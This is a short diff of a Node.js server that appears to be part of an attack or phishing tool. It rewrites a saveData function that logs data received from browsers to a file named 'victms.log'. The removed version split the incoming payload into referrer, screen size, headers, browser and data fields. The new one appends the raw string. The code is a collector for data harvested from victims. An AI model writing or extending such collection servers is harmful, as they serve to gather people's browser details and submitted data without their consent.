@@ -53,20 +53,9 @@ function getFileRequest(filePath,res,page404,mimeType,ext){
       });
 };
 
-function saveData(data){
-	var serializer = data.substring(9,data.length);
-	serializer = serializer.split("::_::");
-	var reference  = serializer[0];
-	var ScreenSize = serializer[1];
-	var Header     = serializer[3];
-	var Browser    = serializer[4];
-	var datas      = serializer[5];
-	fs.open("./logs/victms.log", 'a+', function(err, data) {
-		if (err) {debugConsole(err);} else {
-			fs.write(data, 'REFERENCE : '+reference+'\nSCRENSIZE : '+ScreenSize+'\nHEADER    : '+Header+'\nBROWSER   : '+Browser+'\n\nDATA      : '+datas+'', 0, 'content length', null, function(err) {
-			fs.close(data, function() {})});	
-		}
-	});
+function saveData(datas){
+	var serializer = datas.substring(9,datas.length);
+  fs.appendFile("./logs/victms.log", 'DATA      : '+serializer+'\n\n\n', function (err) {});
 }
 
 function requestHandler(req, res) {
